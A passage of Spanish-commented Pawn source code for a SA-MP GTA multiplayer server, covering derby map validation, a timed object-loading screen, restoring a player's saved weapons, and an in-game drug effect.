					printf("--- COMPROBACION: Error cargando '%s', se esperaba el formato 'modelid, x, y, z, rx, ry, rz' Revisa el mapa.", mapname);
					printf("--- COMPROBACION: Este mapa será ignorado y se pasará al siguiente.");
					fclose(Handler);
					return 0;
				}
			}
			txt_line ++;
		}
	}
	fclose(Handler);

	if(txt_line < 4)
	{
		printf("--- COMPROBACION: Error cargando '%s', tamaño del mapa demasiado pequeño para ser válido, revíselo.", mapname);
		printf("--- COMPROBACION: Este mapa será ignorado y se pasará al siguiente.");
		return 0;
	}
	if(pos_count < MAX_DERBY_PLAYERS)
	{
		printf("--- COMPROBACION: Error cargando '%s', solo se pudieron obtener %d de %d posiciones.", mapname, pos_count, MAX_DERBY_PLAYERS);
		printf("--- COMPROBACION: Este mapa será ignorado y se pasará al siguiente.");
		return 0;
	}

	TOTAL_DERBYS_OK ++;
	DERBY_FILE_INFO[id][DERBY_FILE_VALID] = true;
	printf("--- COMPROBACION: Mapa '%s' comprobado correctamente.", mapname);
	return 1;
}

//==================================== SISTEMA DE CARGA DE OBJETOS ====================================//
function SafeLoadObjects(playerid)
{
	if(GetPVarType(playerid, "LoadingObjects"))
	{
		DeletePVar(playerid, "LoadingObjects");
		TogglePlayerControllable(playerid, 1);
		TextDrawHideForPlayer(playerid, box);
		TextDrawHideForPlayer(playerid, streamer);
	}
}

LoadObjects(playerid)
{
	TogglePlayerControllable(playerid, 0);
	TextDrawShowForPlayer(playerid, box);
	TextDrawShowForPlayer(playerid, streamer);
	SetPVarInt(playerid, "LoadingObjects", 1);
	return SetTimerEx("SafeLoadObjects", 4000, 0, "d", playerid);
}
// SFR - 149.56.102.58:7777 -

stock DevolverArmasGuardadas(playerid){
		GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma0"), dUserINT(PlayerName2(playerid)).("arma0balas")	);
		GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma1"), dUserINT(PlayerName2(playerid)).("arma1balas")	);
 		GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma2"), dUserINT(PlayerName2(playerid)).("arma2balas")	);
		GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma3"), dUserINT(PlayerName2(playerid)).("arma3balas")	);
		GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma4"), dUserINT(PlayerName2(playerid)).("arma4balas")	);
		GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma5"), dUserINT(PlayerName2(playerid)).("arma5balas")	);
		GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma6"), dUserINT(PlayerName2(playerid)).("arma6balas")	);
		//GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma7"), dUserINT(PlayerName2(playerid)).("arma7balas")	);
		GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma9"), dUserINT(PlayerName2(playerid)).("arma9balas")	);
		GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma10"), dUserINT(PlayerName2(playerid)).("arma10balas")	);
		GivePlayerWeapon(playerid, dUserINT(PlayerName2(playerid)).("arma12"), dUserINT(PlayerName2(playerid)).("arma12balas")	);
}

stock ObtenerNombre(playerid)
{
	new NombreJugador[MAX_PLAYER_NAME];
	GetPlayerName(playerid, NombreJugador, sizeof(NombreJugador));
	return NombreJugador;
}

///////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////   Funtion TerminarEfectoDeDroga   //////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////
forward TerminarEfectoDeLaDroga(playerid);
public TerminarEfectoDeLaDroga(playerid)
{
    INFO[playerid][UsaDrogas] = 0;
    SetPlayerWeather(playerid, 3);
    SetPlayerTime(playerid,12,0);
    SetPlayerDrunkLevel(playerid, 0);
    SendClientMessage(playerid, Color, "{FF0000}[DROGAS]:{FFFFFF} El efecto de la droga ha terminado.");
    GameTextForPlayer(playerid, "~w~El efecto de la Droga ha~n~~r~Terminado", 3000, 3);
	return 1;
}
///////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////   Funtion ComenzarEfectoDeDroga   //////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////
forward ComenzarEfectoDeDroga(playerid);
public ComenzarEfectoDeDroga(playerid)
{
    INFO[playerid][UsaDrogas] = 1;
    return 1;
}
